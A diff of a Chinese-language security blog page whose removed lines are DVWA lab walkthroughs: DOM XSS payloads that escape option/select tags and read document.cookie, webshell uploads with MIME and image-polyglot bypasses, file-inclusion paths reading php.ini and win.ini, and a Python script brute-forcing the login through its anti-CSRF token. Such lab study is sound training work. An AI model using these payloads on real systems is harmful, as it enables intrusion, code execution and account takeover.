-</code></pre><p><img src="/2019/03/14/DVWA-xss/18.jpg" alt="在这里插入图片描述"><br>成功进行注入，查看源码发现，没有任何保护措施<br><img src="/2019/03/14/DVWA-xss/19.jpg" alt="在这里插入图片描述"><br><strong>（二）、尝试medium等级</strong><br>发现low等级的方法已经失效了，经过尝试可以发现，script标签被过滤了，过滤成English。<br>查看源码发现只过滤了script标签<br><img src="/2019/03/14/DVWA-xss/20.jpg" alt="在这里插入图片描述"><br>那么我们尝试 下<code>&lt;img src= x onerror=alert(1)&gt;</code><br>页面没有反应<br>查看网页源代码，发现我们的语句被插入到了value值中，但是并没有插入到option标签的值中，使用img标签没有发挥作用<br><img src="/2019/03/14/DVWA-xss/21.jpg" alt="在这里插入图片描述"><br>我们尝试闭合option</p>
-<pre><code>`http://localhost/DVWA/vulnerabilities/xss_d/?default= &gt;&lt;/option&gt;&lt;img src= x onerror=alert(1)`&gt;
-</code></pre><p>发现还没没有闭合成功。<br><img src="/2019/03/14/DVWA-xss/22.jpg" alt="在这里插入图片描述"><br>我们闭合用的&gt;&lt;被闭合到option的值当中去了<br>。那么我们往更高一层的select标签闭合</p>
-<pre><code>http://localhost/DVWA/vulnerabilities/xss_d/?default=  &gt;&lt;/option&gt;&lt;/select&gt;&lt;img src=1 onerror=alert(&apos;hhh&apos;)&gt;
-</code></pre><p>成功注入<br><img src="/2019/03/14/DVWA-xss/23.jpg" alt="在这里插入图片描述"><br><strong>（三）、尝试high等级</strong><br>尝试了一番之后没有结果<br>我们查看下源码，发现源码使用了白名单的方法，<br><img src="/2019/03/14/DVWA-xss/24.jpg" alt="在这里插入图片描述"><br>那我们是不是可以使用#注入，第一次从本地写入，第二次刷新的时候执行我们注入的xss</p>
-<pre><code>http://localhost/DVWA/vulnerabilities/xss_d/?default=English#&lt;/option&gt;&lt;/select&gt;&lt;BODY ONLOAD=alert(document.cookie)&gt;
-</code></pre><p>成功注入<br><img src="/2019/03/14/DVWA-xss/25.jpg" alt="在这里插入图片描述"></p>
-<h2 id="（四）、impose等级"><a href="#（四）、impose等级" class="headerlink" title="（四）、impose等级"></a>（四）、impose等级</h2><p>发现我们输入什么都会在客户端体现，查看源码<br><img src="/2019/03/14/DVWA-xss/26.jpg" alt="在这里插入图片描述"><br>发现在客户端进行了保护。<br><img src="/2019/03/14/DVWA-xss/27.jpg" alt="在这里插入图片描述"><br>这段代码的功能是<br>不会对URL输入进行URL编码过的内容再进行URL解码从而杜绝了DOM型XSS，这就是为什么我们输入什么就会在框中体现<br><img src="/2019/03/14/DVWA-xss/28.jpg" alt="在这里插入图片描述"></p>
-
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://wrgiun.github.io/2019/03/14/file-upload/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="wr">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="giun">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2019/03/14/file-upload/" class="post-title-link" itemprop="url">file upload</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-
-              
-                
-              
-
-              <time title="创建时间：2019-03-14 15:54:14 / 修改时间：15:57:47" itemprop="dateCreated datePublished" datetime="2019-03-14T15:54:14+08:00">2019-03-14</time>
-            
-
-            
-              
-
-              
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/bugkuCTF/" itemprop="url" rel="index"><span itemprop="name">bugkuCTF</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p><img src="/2019/03/14/file-upload/1.jpg" alt="在这里插入图片描述"></p>
-<h2 id="一、尝试low等级"><a href="#一、尝试low等级" class="headerlink" title="一、尝试low等级"></a>一、尝试low等级</h2><p>我们上传一个phpinfo.php文件，文件内容为<code>&lt;?php echo pphpinfo()?&gt;</code>,<br><img src="/2019/03/14/file-upload/2.jpg" alt="在这里插入图片描述"><br>把路径拼接起来，输入</p>
-<pre><code>http://localhost/DVWA/hackable/uploads/phpinfo.php
-</code></pre><p>成功获得执行我们上次的文件<br><img src="/2019/03/14/file-upload/3.jpg" alt="在这里插入图片描述"><br>我们再上传个一句话木马文件<br>然后直接尝试系统命令</p>
-<pre><code>http://localhost/DVWA/hackable/uploads/cmd.php
-?cmd=system(&apos;net user&apos;);
-</code></pre><p><img src="/2019/03/14/file-upload/4.jpg" alt="在这里插入图片描述"></p>
-<h2 id="二、尝试medium等级"><a href="#二、尝试medium等级" class="headerlink" title="二、尝试medium等级"></a>二、尝试medium等级</h2><p>上传一句话木马文件，发现报错，只支持jpeg和png格式的图片<br><img src="/2019/03/14/file-upload/5.jpg" alt="在这里插入图片描述"><br>那么我们抓包看看，上传成功和上传不成功的包有什么差别，然后就是不断的尝试，不端地把上传不成功的包与上传成功的不同之处改成和上传成功的包相同，然后重新发送，发现了破解的办法<br>上传cmd.php文件，然后把文件类型改为imag/jpeg，重新发送就可以了。<br><img src="/2019/03/14/file-upload/6.jpg" alt="在这里插入图片描述"><br>三、high等级<br>前面的方法都不能用了。尝试了文件后缀名和文件内容发现都失败了<br><img src="/2019/03/14/file-upload/7.jpg" alt="在这里插入图片描述"><br>那么我们就想到了”制作内涵图“，就是把文件和图片合并成一张图片<br>在cmd窗口下用命令结合</p>
-<pre><code>copy 1.jpg/b  +1.txt/a  2.jpg
-</code></pre><p>结合成2.jpg<br>我们用编辑器打开，在文件末尾发现了我们的一句话木马<br><img src="/2019/03/14/file-upload/8.jpg" alt="在这里插入图片描述"></p>
-<p>那既然传上去了，那么我们要怎么用呢<br>首先我们需要切换下服务器，切换成nginx<br><img src="/2019/03/14/file-upload/9.jpg" alt="在这里插入图片描述"><br>在phpini配置文件里把下面这个参数改为一，默认是1<br><img src="/2019/03/14/file-upload/10.jpg" alt="在这里插入图片描述"><br>然后输入<code>http://localhost/DVWA//hackable/uploads/2.jpg/2.php</code>即可上传<br><img src="/2019/03/14/file-upload/11.jpg" alt="在这里插入图片描述"></p>
-
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://wrgiun.github.io/2019/03/14/file-includes/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="wr">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="giun">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2019/03/14/file-includes/" class="post-title-link" itemprop="url">file includes</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-
-              
-                
-              
-
-              <time title="创建时间：2019-03-14 15:46:13 / 修改时间：15:53:43" itemprop="dateCreated datePublished" datetime="2019-03-14T15:46:13+08:00">2019-03-14</time>
-            
-
-            
-              
-
-              
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/bugkuCTF/" itemprop="url" rel="index"><span itemprop="name">bugkuCTF</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="一、前置知识"><a href="#一、前置知识" class="headerlink" title="一、前置知识"></a>一、前置知识</h2><p><strong>1、什么是文件包含</strong><br>一种代码处理方法，函数如include,require等，参数是文件名。<br><strong>2、文件包含漏洞</strong><br>文件名的参数用户可控且过滤不严，被攻击者偷梁换柱<br><img src="/2019/03/14/file-includes/1.jpg" alt="在这里插入图片描述"></p>
-<h2 id="二、尝试low等级"><a href="#二、尝试low等级" class="headerlink" title="二、尝试low等级"></a>二、尝试low等级</h2><p>打开文件包含题目会发现以下提示，我们找到php.ini配置文件（一般在安装目录里），把 allow_url_include的值改成on，然后重启phpstudy即可<br>The PHP function allow_url_include is not enabled<br><img src="/2019/03/14/file-includes/2.jpg" alt="在这里插入图片描述"><br>我们点击文件一、文件2、文件3、发现了下图的规律。<br><img src="/2019/03/14/file-includes/3.jpg" alt="在这里插入图片描述"><br>那么我们尝试下输入</p>
-<pre><code>http://localhost/DVWA/vulnerabilities/fi/?page=test.php
-</code></pre><p><img src="/2019/03/14/file-includes/4.jpg" alt="在这里插入图片描述"><br>那么我们就可以利用这个漏洞了，输入</p>
-<pre><code>http://localhost/DVWA/vulnerabilities/fi/?page=..\..\php.ini
-</code></pre><p>  <code>..\</code>的意思是返回上一级目录。因为php.ini在DVWA目录下，所以使用<code>..\..\</code><br>  直接输出了这个文件的内容<br>  <img src="/2019/03/14/file-includes/5.jpg" alt="在这里插入图片描述"><br>  <strong>那么问题又来了，读取其他目录的php脚本会怎样，显示内容还是执行php代码</strong></p>
-<p>  输入</p>
-<pre><code>http://localhost/DVWA/vulnerabilities/fi/?page=..\..\phpinfo.php
-</code></pre><p><img src="/2019/03/14/file-includes/6.jpg" alt="在这里插入图片描述"><br>  这<br>说明了文件包含不仅仅显示内容还会执行文件。</p>
-<p><strong>那什么会执行远程文件吗？</strong><br>我们再次尝试<br><img src="/2019/03/14/file-includes/7.jpg" alt="在这里插入图片描述"><br><img src="/2019/03/14/file-includes/8.jpg" alt="在这里插入图片描述"><br>可以执行并且非php文件里面只要包含php代码就可以执行 </p>
-<p><strong>那么问题又来了。远程执行php文件和非php文件有什么差别吗？</strong><br>当然有了，以上面的phpinfo.php和phpinfo.txt为例，进行说明<br>phpinfo.php是在攻击者的web服务器上执行，这毫无意义，我们期望的是在受害者的web服务器上执行，所以phpinfo.txt才是正解，（phpinfo.txt在受害者的web服务器上执行）</p>
-<h2 id="三、尝试medium等级"><a href="#三、尝试medium等级" class="headerlink" title="三、尝试medium等级"></a>三、尝试medium等级</h2><p>用low等级的方法发现依然成功。<br>但是他和low的等级有什么差别吗<br>差别在于它过滤了../而low的等级没有。<br><img src="/2019/03/14/file-includes/9.jpg" alt="在这里插入图片描述"><br><img src="/2019/03/14/file-includes/10.jpg" alt="在这里插入图片描述"><br>第一张图为low等级，第二张图为medium等级代码。<br>可以发现差别在于<a href="http://www.w3school.com.cn/php/func_string_str_replace.asp" target="_blank" rel="noopener">str_place()函数</a><br>他把我们传入的参数中的<code>../和..\&quot;</code>替换成了空。<br>还有<code>https://和http://</code>替换成了空</p>
-<p>那么medium等级的远程文件可以执行吗。<br>当然可以了<br>既然过滤了http://那么我们可以使用<code>httphttp://://</code><br>如下图<br><img src="/2019/03/14/file-includes/11.jpg" alt="在这里插入图片描述"></p>
-<h2 id="四、high等级"><a href="#四、high等级" class="headerlink" title="四、high等级"></a>四、high等级</h2><p>我们尝试了medium等级的方法，进行本地文件执行发现以下错误<br><img src="/2019/03/14/file-includes/12.jpg" alt="在这里插入图片描述"><br>经常一番尝试发现只执行以file开头的文件<br>。那么这里就不得不提到file协议了</p>
-<p><strong>那么什么是files协议呢</strong><br>就是文本传输协议，访问本地计算机中的文件</p>
-<p>输入</p>
-<pre><code>http://localhost/DVWA/vulnerabilities/fi/?page=file://F:\php\PHPTutorial\WWW\DVWA\phpinfo.php
-</code></pre><p>file://后面是本地路径，成功执行本地文件<br><img src="/2019/03/14/file-includes/13.jpg" alt="在这里插入图片描述"><br>也可以查看系统文件</p>
-<pre><code>http://localhost/DVWA/vulnerabilities/fi/?page=file://C:\windows\win.ini
-</code></pre><p><img src="/2019/03/14/file-includes/14.jpg" alt="在这里插入图片描述"></p>
-<p>那么怎样进行远程文件执行呢<br>medium方法不可以，<br>查看源码，<br>可知用<a href="http://www.runoob.com/php/func-filesystem-fnmatch.html" target="_blank" rel="noopener">fnmatch()函数</a>限制参数文件的开头<br><img src="/2019/03/14/file-includes/15.jpg" alt="在这里插入图片描述"><br>进入impose等级<br><img src="/2019/03/14/file-includes/16.jpg" alt="在这里插入图片描述"><br>那么要如何远程执行呢，要就有把文件放在图片里，然后上传到web服务器，怎么把文件放在图片里这篇博客里的<a href="https://blog.csdn.net/qq_44105778/article/details/88372331" target="_blank" rel="noopener">high等级部分</a>说明了<br><img src="/2019/03/14/file-includes/17.jpg" alt="在这里插入图片描述"></p>
-
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://wrgiun.github.io/2019/03/09/Brute-Force/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="wr">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="giun">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2019/03/09/Brute-Force/" class="post-title-link" itemprop="url">Brute Force</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-
-              
-                
-              
-
-              <time title="创建时间：2019-03-09 17:24:56 / 修改时间：17:30:42" itemprop="dateCreated datePublished" datetime="2019-03-09T17:24:56+08:00">2019-03-09</time>
-            
-
-            
-              
-
-              
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/DVWA/" itemprop="url" rel="index"><span itemprop="name">DVWA</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="一、-第一题"><a href="#一、-第一题" class="headerlink" title="一、 第一题"></a>一、 第一题</h2><p><strong>先从难度是low的开始。</strong><br>我们尝试了下admin’# 直接把密码注释掉，<br><img src="/2019/03/09/Brute-Force/1.jpg" alt="在这里插入图片描述"><br>成功破解。<br><strong>我们尝试下medium等级</strong><br>还是尝试了下admin’#，发现密码错误，看来这个漏洞被防护了<br><img src="/2019/03/09/Brute-Force/2.jpg" alt="在这里插入图片描述"></p>
-<p>首先我们抓包看下http请求头的信息，发现可以在http头部看到看到我们提交的账号密码，既然这样我们使用owasp zap 软件暴力破解。<br><img src="/2019/03/09/Brute-Force/3.jpg" alt="在这里插入图片描述"><br>这是我使用的字典，大家可以去百度搜索更多的字典<br><img src="/2019/03/09/Brute-Force/4.jpg" alt="在这里插入图片描述"><br>暴力成功破解出账号密码。<br><img src="/2019/03/09/Brute-Force/5.jpg" alt="在这里插入图片描述"><br>下面我们尝试high等级，发抓包发现多了个user_token(它的职责是保护用户的用户名及密码多次提交，以防密码泄露。)<br>且每一次的user_take会被记录到下一次请求头里的referrer里。这样上面的方法我们就不能使用了。<br>但是认真观察，我们可以发现第一次进登录页面是没有user_token，这就是突破口。那么就可以一直在登录界面和第一次登录进行破解。<br>还有一种思路是虽然加了user_token,但是并没有对尝试的次数进行限制，我们可以先获取user_token，然后用user_token加上用户密码验证身份。<br>我们使用python脚本自动化爆力破解(第二种思路)。</p>
-<pre><code>from bs4 import BeautifulSoup
-import requests
-
-header={
-        &apos;GET&apos;: &apos;http://localhost/DVWA/vulnerabilities/brute/ HTTP/1.1&apos;,
-        &apos;User-Agent&apos;:&apos;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0&apos;,
-        &apos;Accept&apos;:&apos;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&apos;,
-        &apos;Accept-Language&apos;:&apos;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&apos;,
-        &apos;Referer&apos;:&apos;http://localhost/DVWA/vulnerabilities/brute/&apos;,
-        &apos;cookie&apos;:&apos;PHPSESSID=8fbhto539r4fnjt4dduolvikj3; security=high&apos;,
-        &apos;Connection&apos;:&apos;keep-alive&apos;,
-        &apos;Upgrade-Insecure-Requests&apos;:&apos;1&apos;,
-         &apos;Host&apos;:&apos;127.0.0.1&apos;
-        }
-requrl=&quot;http://127.0.0.1/DVWA/vulnerabilities/brute/&quot;
-
-def get_token(requrl,header):
-    response=requests.get(url=requrl,headers=header)
-    print (response.status_code,len(response.content))
-    soup=BeautifulSoup(response.text,&quot;html.parser&quot;)
-    input=soup.form.select(&quot;input[type=&apos;hidden&apos;]&quot;)   #返回的是一个list列表
-    user_token=input[0][&apos;value&apos;]                   #获取用户的token
-    return user_token
-
-user_token=get_token(requrl,header)
-i=0
-for line in open(&quot;password.txt&quot;):
-    requrl=&quot;http://127.0.0.1/DVWA/vulnerabilities/brute/?username=admin&amp;password=&quot;+line.strip()+&quot;&amp;Login=Login&amp;user_token=&quot;+user_token
-    i=i+1
-    print (i , &apos;admin&apos; ,line.strip(),end=&quot;  &quot;)
-    user_token=get_token(requrl,header)
-    # 尝试次数
-    if(i==20):
-        break
-</code></pre><p><img src="/2019/03/09/Brute-Force/6.jpg" alt="在这里插入图片描述">)</p>
-<p>我们继续查看impose等级，发现输错3次就被限制15分钟无法登入。那么还有什么是可以防止暴力破解的呢？还有验证码。</p>
-
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2639,7 +2814,7 @@ for line in open(&quot;password.txt&quot;):
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">34</span>
+                    <span class="site-state-item-count">38</span>
                     <span class="site-state-item-name">日志</span>
                   </a>
                 </div>
